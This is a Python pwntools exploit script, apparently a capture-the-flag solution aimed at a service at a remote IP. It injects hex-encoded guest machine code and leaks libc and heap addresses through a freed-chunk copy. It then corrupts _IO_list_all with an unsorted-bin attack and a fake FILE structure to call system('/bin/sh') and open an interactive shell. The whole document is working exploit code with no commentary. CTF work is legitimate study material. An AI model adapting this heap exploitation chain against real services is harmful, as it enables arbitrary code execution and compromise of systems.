from pwn import *

def alloc(size):
  r.recvuntil("choice:")
  r.send("1")
  r.recvuntil("ze:")
  r.send(p16(size))

def update(index, content):
  r.recvuntil("choice:")
  r.send("2")
  r.recvuntil("ex:")
  r.send(p8(index))
  r.recvuntil("tent:")
  r.send(content)

def allocHost(size):
  r.recvuntil("choice:")
  r.send("4")
  r.recvuntil("ze:")
  r.send(p16(size))

def updateHost(index, size, content):
  r.recvuntil("choice:")
  r.send("5")
  r.recvuntil("ze:")
  r.send(p16(size))
  r.recvuntil("ex:")
  r.send(p8(index))
  r.recvuntil("tent:")
  r.send(content)

def freeHost(index):
  r.recvuntil("choice:")
  r.send("6")
  r.recvuntil("dex:")
  r.send(p8(index))

def exit(index):
  r.recvuntil("choice:")
  r.send("7")

def copy(index, size):
  r.recvuntil("choice:")
  r.send("8")
  r.recvuntil("ze:")
  r.send(p16(size))
  r.recvuntil("ex:")
  r.send(p8(index))

def leak(size):
  r.recvuntil("choice:")
  r.send("9")
  r.recvuntil("ze:")
  r.send(p16(size))
  return r.recvn(size)

#r = process("./bin")
r = remote("34.236.229.208", 9999)

staging_second = "90909090909090909090909090909090b85200bb0700e82700b86900bb0003e80c00b85200bb0700e81500e93b0051525689d989c6e417880446e2f95e5a59c351525689d989c68a04e61746e2f95e5a59c36c6f616465640a".decode("hex")
replaced_code = "b80302bb0d00e86701b83e23bb0100e87001be3e238b043c3474203c3574123c36741d3c3774233c38740b3c397416ebcfe8e300ebcae89800ebc5e80d00ebc0e83500ebbbe86000ebb6f4505351525657b81002bb0500e81601b84023bb0200e81f016800019d8b1e4023b800010f01c15f5e5a595b58c3505351525657b8fd01bb0600e8e900b84323bb0100e8f2006800019db80101bb01008b0e43230f01c15f5e5a595b58c3505351525657b81002bb0500e8b900b84023bb0200e8c200b800408b1e4023e8a6005f5e5a595b58c3505351525657b81002bb0500e89000b84023bb0200e89900b8fd01bb0600e87e00b84323bb0100e887006800019db80201bb02008b0e43238b1640230f01c15f5e5a595b58c3505351525657b81002bb0500e84a00b84023bb0200e85300b8fd01bb0600e83800b84323bb0100e84100b81502bb0800e82600b800408b1e4023e82e006800019db80201bb01008b0e43238b1640230f01c15f5e5a595b58c351525689d989c68a04e61746e2f95e5a59c351525689d989c6e417880446e2f95e5a59c3496e6465783a596f75722063686f6963653a0a53697a653a436f6e74656e743a".decode("hex")

for i in range(0xb):
  alloc(0x1000)

alloc(len(staging_second))
update(0xb, staging_second)
r.recvuntil("loaded")
r.send(replaced_code.ljust(0x300, "\x90"))

for i in range(4):
  allocHost(400)

freeHost(1)
copy(1, 8)
libcbase = struct.unpack("Q", leak(8).ljust(8, "\x00"))[0] - 0x3c4b78

allocHost(400)
freeHost(2)
freeHost(0)
copy(0, 8)
heapbase = struct.unpack("Q", leak(8).ljust(8, "\x00"))[0] - 0x340

allocHost(0x80)
allocHost(0x80) #target chunk to fuck up in unsorted bins
freeHost(6)
iolistall = libcbase + 0x3c5520
system = libcbase + 0x45390
payload = "L"*128 + "/bin/sh\x00" + p64(0x61) + p64(0x0) + p64(iolistall-0x10) + p64(0x0) + p64(0x3)
payload += "Z"*144 + p64(0x0)*3 + p64(heapbase + 0x4b8)
payload += p64(system) * ((400 - len(payload)) / 8)
updateHost(2, 400, payload)
allocHost(0x80)

r.interactive()